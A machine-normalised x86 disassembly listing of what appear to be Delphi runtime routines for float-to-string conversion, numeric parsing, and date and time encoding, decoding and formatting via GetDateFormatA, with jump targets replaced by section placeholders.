mov edi 0x4
fbstp [ ebp - 0x18 ]
lea edi [ ebx + 0x3 ]
fwait
or ecx ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
fidiv [ edi + eax * 4 + r-xdata ]
inc ecx
sub eax 0xa7640000
sbb edx 0xde0b6b3
jae r-xdata
dec ecx
add eax 0xa7640000
adc edx 0xde0b6b3
mov al cl
add al 0x30
stosb [ edi ]
mov ecx 0x9
mov ecx 0x9
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
mov eax edi
lea ecx [ ebx + edx + 0x3 ]
sub eax ecx
add al 0x30
stosb [ edi ]
mov al ah
and al 0xf
mov al ah
and al 0xf
jne r-xdata
mov [ edi ] 0x0
dec edi
cmp [ edi ] 0x30
je r-xdata
mov edx [ esi + 0x4 ]
shr edx 0x1f
jmp r-xdata
add al 0x30
stosb [ edi ]
dec ecx
jne r-xdata
dec ecx
jne r-xdata
mov [ ebx ] ax
mov [ ebx + 0x2 ] dl
retn
mov al [ ecx + ebp - 0x19 ]
mov ah al
shr al 0x4
jne r-xdata
jmp r-xdata
sub_409674
push ebp
mov ebp esp
add esp 0xfffffff4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov [ ebp - 0x4 ] 0x0
mov al [ rw-data ]
mov [ ebp - 0x5 ] al
mov ebx ecx
fwait
fnstcw [ ebp - 0x8 ]
fwait
fnclex
fldcw [ rw-data ]
fldz
call sub_40972b
mov bh [ esi ]
cmp bh 0x2b
je r-xdata
inc esi
cmp bh 0x2d
jne r-xdata
cmp ecx esi
je r-xdata
inc esi
call sub_409736
neg edx
mov ecx esi
call sub_409736
xor edx edx
mov al [ esi ]
cmp al [ ebp - 0x5 ]
jne r-xdata
fstp st0
mov al [ esi ]
and al 0xdf
cmp al 0x45
jne r-xdata
pop ebx
pop esi
pop edi
mov esp ebp
pop ebp
retn
call sub_40972b
cmp [ esi ] 0x0
jne r-xdata
inc esi
push edx
call sub_409752
pop eax
add edx eax
mov eax edx
cmp bl 0x1
jne r-xdata
push ebx
mov ebx [ ebp - 0x4 ]
call j_sub_402d80
pop ebx
cmp bh 0x2d
jne r-xdata
add eax 0x4
cmp bl 0x0
je r-xdata
fchs
fstp [ edi ]
fistp [ edi ]
jmp r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
fwait
fnstsw ax
test ax 0x9
jne r-xdata
fwait
fnclex
fldcw [ ebp - 0x8 ]
fwait
jmp r-xdata
sub_409736
xor eax eax
xor edx edx
dec esi
retn
fimul [ rw-data ]
mov [ ebp - 0xc ] eax
fiadd [ ebp - 0xc ]
inc edx
jmp r-xdata
lodsb [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
sub_409752
xor eax eax
xor edx edx
mov cl [ esi ]
cmp cl 0x2b
je r-xdata
inc esi
cmp cl 0x2d
jne r-xdata
cmp cl 0x2d
jne r-xdata
inc esi
imul edx edx 0xa
add edx eax
cmp edx 0x1f4
jb r-xdata
mov al [ esi ]
sub al 0x3a
add al 0xa
jae r-xdata
retn
neg edx
sub_409788
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0xf
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
xor ecx ecx
call sub_409174
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4040f8
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4097b8
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x0
lea edx [ ebp + 0x8 ]
lea eax [ ebp - 0x40 ]
mov cl 0x1
call sub_409174
mov ecx eax
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_4040f8
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4097e8
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_4044c8
mov edx esp
xor ecx ecx
call sub_409674
test al al
jne r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] 0xb
lea edx [ esp + 0xc ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407f4c
sub_409840
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044c8
mov edx esp
xor ecx ecx
call sub_409674
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_40986c
push ebx
push esi
add esp 0xfffffff4
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044c8
mov edx esp
xor ecx ecx
call sub_409674
test al al
je r-xdata
add esp 0xc
pop esi
pop ebx
retn
fld [ esp ]
fstp [ esi ]
fwait
sub_4098b4
push ebp
mov ebp esp
push ebx
xor ebx ebx
mov ecx eax
fld [ ebp + 0x8 ]
fmul [ ebx + rw-data ]
sub esp 0x8
fistp [ esp ]
fwait
pop eax
pop edx
or edx edx
jns r-xdata
div [ ebx + rw-data ]
neg edx
neg eax
sbb edx 0x0
div [ ebx + rw-data ]
neg eax
jmp r-xdata
add eax 0xa955a
mov [ ecx ] edx
mov [ ecx + 0x4 ] eax
pop ebx
pop ebp
retn 0x8
sub_4098f8
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
mov esi [ ebp + 0xc ]
mov [ ebp - 0x1 ] 0x0
cmp ax 0x18
jae r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ecx
pop ecx
pop ebp
retn 0x8
cmp dx 0x3c
jae r-xdata
cmp cx 0x3c
jae r-xdata
cmp si 0x3e8
jae r-xdata
movzx eax ax
imul eax eax 0x36ee80
movzx edx dx
imul edx edx 0xea60
add eax edx
movzx edx cx
imul edx edx 0x3e8
add eax edx
movzx edx si
add eax edx
mov [ ebp - 0x8 ] eax
fild [ ebp - 0x8 ]
fdiv [ r-xdata ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x1 ] 0x1
sub_409968
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4098f8
test al al
jne r-xdata
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_407f34
sub_4099a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
call sub_4098b4
mov eax [ ebp - 0xc ]
lea ecx [ ebp - 0x2 ]
mov dx 0xea60
call sub_407f18
push esi
mov ecx ebx
movzx eax [ ebp - 0x2 ]
mov dx 0x3c
call sub_407f18
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
movzx eax [ ebp - 0x4 ]
mov dx 0x3e8
call sub_407f18
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_409a04
push ebx
push esi
mov ecx eax
movzx eax cx
and eax 0x3
test eax eax
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
movzx ebx cx
mov eax ebx
mov esi 0x64
xor edx edx
div esi
test edx edx
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax ebx
mov ecx 0x190
xor edx edx
div ecx
test edx edx
je r-xdata
sub_409a40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov [ ebp - 0x2 ] ax
mov [ ebp - 0x3 ] 0x0
mov ax [ ebp - 0x2 ]
call sub_409a04
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
cmp [ ebp - 0x2 ] 0x1
jb r-xdata
mov al [ ebp - 0x3 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ ebp - 0x2 ] 0x270f
ja r-xdata
cmp di 0x1
jb r-xdata
cmp di 0xc
ja r-xdata
cmp bx 0x1
jb r-xdata
movzx eax di
cmp bx [ esi + eax * 2 - 0x2 ]
ja r-xdata
movzx eax di
dec eax
test eax eax
jle r-xdata
movzx ecx [ ebp - 0x2 ]
dec ecx
mov eax ecx
mov esi 0x64
cdq
idiv esi
imul esi ecx 0x16d
mov edx ecx
test edx edx
jns r-xdata
mov ecx 0x1
sar edx 0x2
add esi edx
sub esi eax
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
add esi eax
movzx eax bx
add esi eax
sub esi 0xa955a
mov [ ebp - 0x8 ] esi
fild [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0x3 ] 0x1
add edx 0x3
add bx [ esi + ecx * 2 - 0x2 ]
inc ecx
dec eax
jne r-xdata
sub_409b08
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
mov ecx edi
mov edx esi
mov eax ebx
call sub_409a40
test al al
jne r-xdata
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_407f34
sub_409b38
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
lea eax [ ebp - 0x18 ]
call sub_4098b4
mov ecx [ ebp - 0x14 ]
test ecx ecx
jg r-xdata
mov eax ecx
mov esi 0x7
cdq
idiv esi
inc edx
mov [ ebx ] dx
dec ecx
mov bx 0x1
cmp ecx 0x23ab1
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp - 0xc ]
mov [ eax ] 0x0
mov [ ebx ] 0x0
xor edx edx
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
lea eax [ ebp - 0x10 ]
mov dx 0x8eac
xchg ecx eax
call sub_407f18
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
sub ecx 0x23ab1
add bx 0x190
cmp ecx 0x23ab1
jge r-xdata
mov eax edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
imul ax [ ebp - 0x10 ] 0x64
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x5b5
call sub_407f18
mov ax [ ebp - 0x10 ]
shl eax 0x2
add bx ax
lea eax [ ebp - 0xe ]
push eax
lea ecx [ ebp - 0x10 ]
movzx eax [ ebp - 0xe ]
mov dx 0x16d
call sub_407f18
cmp [ ebp - 0x10 ] 0x4
jne r-xdata
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x8eac
add bx [ ebp - 0x10 ]
mov eax ebx
call sub_409a04
mov edx eax
xor eax eax
mov al dl
lea eax [ eax + eax * 2 ]
lea esi [ eax * 8 + rw-data ]
mov ax 0x1
dec [ ebp - 0x10 ]
add [ ebp - 0xe ] 0x16d
mov ecx [ ebp - 0x4 ]
mov [ ecx ] bx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] ax
mov ax [ ebp - 0xe ]
inc eax
mov ecx [ ebp - 0xc ]
mov [ ecx ] ax
mov cx [ ebp - 0x10 ]
sub [ ebp - 0xe ] cx
inc eax
jmp r-xdata
movzx ecx ax
mov cx [ esi + ecx * 2 - 0x2 ]
mov [ ebp - 0x10 ] cx
mov cx [ ebp - 0xe ]
cmp cx [ ebp - 0x10 ]
jb r-xdata
sub_409c84
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
mov eax esi
call sub_409b38
pop esi
pop ecx
pop ebp
retn 0x8
sub_409ca4
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
call sub_4098b4
mov eax [ ebp - 0x4 ]
mov ecx 0x7
cdq
idiv ecx
mov eax edx
inc eax
pop ecx
pop ecx
pop ebp
retn 0x8
sub_409ce0
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
mov ebx 0x100
sub ebx [ ecx - 0x104 ]
cmp edx ebx
jge r-xdata
test ebx ebx
je r-xdata
mov ebx edx
mov eax [ ebp + 0x8 ]
add [ eax - 0x104 ] ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x104 ]
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + edx - 0x100 ]
mov ecx ebx
call sub_402998
sub_409d24
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4042c8
mov edx eax
mov eax ebx
call sub_409ce0
pop ecx
pop ebx
pop ebp
retn
sub_409d44
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
push 0x4
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] 0x0
lea eax [ ebp - 0x20 ]
push eax
push 0x1
mov ecx rw-data
lea eax [ ebp - 0x10 ]
mov edx 0x10
call sub_408c64
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_409ce0
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409d90
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ eax ]
jmp r-xdata
mov ecx [ eax ]
mov cl [ ecx ]
mov ebx [ ebp + 0x8 ]
cmp cl [ ebx - 0x5 ]
je r-xdata
inc [ eax ]
mov eax [ eax ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
pop ebx
pop ebp
retn
sub_409dbc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x13 ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x12 ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffff2
call sub_409c84
mov eax [ ebp + 0x8 ]
mov [ eax - 0x13 ] 0x1
sub_409df4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1d ] 0x0
jne r-xdata
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe4
push eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1a ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffea
call sub_4099a8
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1d ] 0x1
sub_409e34
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x118 ] ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_409f82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404008
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_409f89
lea eax [ ebp - 0x118 ]
call sub_404008
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404278
dec esi
jne r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub eax 0xd
jne r-xdata
mov eax [ ebx ]
call sub_4042c8
mov edx eax
mov eax [ ebx ]
call sub_40c400
cmp eax 0x4
jne r-xdata
push ebx
mov eax [ ebx ]
mov edx 0x1
call sub_40c574
mov ecx eax
mov eax [ ebx ]
mov edx 0x1
call sub_404528
jmp r-xdata
mov eax [ ebx ]
mov edx 0x3
call sub_40c510
mov esi eax
lea eax [ ebp - 0x114 ]
add esi eax
dec esi
lea eax [ ebp - 0x118 ]
mov edx esi
call sub_404200
mov eax [ ebp - 0x118 ]
mov edx 0x2
call sub_40c574
mov ecx eax
mov eax ebx
mov edx esi
call sub_4040f8
sub_409f9c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40a07a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404008
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0xe ]
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x10 ]
mov [ ebp - 0x12 ] ax
mov eax [ ebp + 0x8 ]
mov ax [ eax - 0x12 ]
mov [ ebp - 0xe ] ax
cmp esi 0x2
jg r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040a0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a081
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
lea edx [ ebp - 0x114 ]
mov ecx 0x100
call sub_404278
dec esi
jne r-xdata
push 0x100
lea eax [ ebp - 0x114 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x4
call GetThreadLocale
push eax
call GetDateFormatA
test eax eax
je r-xdata
mov eax [ ebx ]
cmp [ eax ] 0x30
jne r-xdata
push ebx
mov eax [ ebx ]
call sub_4042c8
mov ecx eax
dec ecx
mov eax [ ebx ]
mov edx 0x2
call sub_404528
sub_40a0a4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
xor edx edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40a825
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a82c
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_40402c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x108 ] 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x108 ]
mov bl 0x20
mov [ ebp - 0x13 ] 0x0
mov [ ebp - 0x1d ] 0x0
mov [ ebp - 0x1e ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
jne r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x108 ]
mov eax [ ebp - 0x4 ]
call sub_40c5f4
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx eax
add dl 0x9f
sub dl 0x1a
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40c5d4
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_409ce0
pop ecx
mov eax [ ebp - 0x4 ]
call sub_40c5f4
mov [ ebp - 0x4 ] eax
mov bl 0x20
jmp r-xdata
mov edx eax
add dl 0xbf
sub dl 0x1a
jae r-xdata
sub al 0x20
and eax 0xff
add eax 0xffffffde
cmp eax 0x38
ja r-xdata
cmp al 0x4d
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409ce0
pop ecx
mov al [ eax + lookup_table_40a187 ]
jmp [ eax * 4 + jump_table_40a1c0 ]
mov ebx eax
cmp bl 0x48
jne r-xdata
push ebp
call sub_409d90
pop ecx
push ebp
call sub_409dbc
pop ecx
cmp [ ebp - 0xc ] 0x2
jg r-xdata
push ebp
call sub_409d90
pop ecx
push ebp
call sub_409dbc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
call sub_409e34
pop ecx
mov eax [ ebp - 0x24 ]
call sub_409d24
pop ecx
jmp r-xdata
push ebp
call sub_409d90
pop ecx
push ebp
call sub_409dbc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0xc ]
call sub_409f9c
pop ecx
mov eax [ ebp - 0x28 ]
call sub_409d24
pop ecx
jmp r-xdata
push ebp
call sub_409d90
pop ecx
push ebp
call sub_409dbc
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409d90
pop ecx
mov eax [ ebp - 0xc ]
dec eax
sub eax 0x2
jb r-xdata
push ebp
call sub_409d90
pop ecx
push ebp
call sub_409df4
pop ecx
mov [ ebp - 0x1f ] 0x0
mov esi [ ebp - 0x4 ]
jmp r-xdata
push ebp
call sub_409d90
pop ecx
push ebp
call sub_409df4
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409d90
pop ecx
push ebp
call sub_409df4
pop ecx
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebp
call sub_409d90
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_409d90
pop ecx
push ebp
call sub_409df4
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_409df4
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408ad4
test eax eax
jne r-xdata
push ebp
call sub_409d90
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0a4
pop ecx
push ebp
call sub_409df4
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_409d44
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_409d44
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_409d44
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_409dbc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_409d44
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_409d44
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_409d44
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0a4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0a4
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_409d44
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408ad4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_409ce0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0a4
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409ce0
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_409ce0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409d24
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ca4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d24
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408ad4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_409ce0
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_409ce0
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_409d24
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ca4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d24
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40c5f4
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408ad4
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_409ce0
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0a4
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_409d44
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408ad4
test eax eax
jne r-xdata
push ebp
call sub_409dbc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_409ca4
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_409d24
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d24
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_409d24
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40c5f4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40a0a4
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_409ce0
pop ecx
jmp r-xdata
push ebp
call sub_409dbc
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
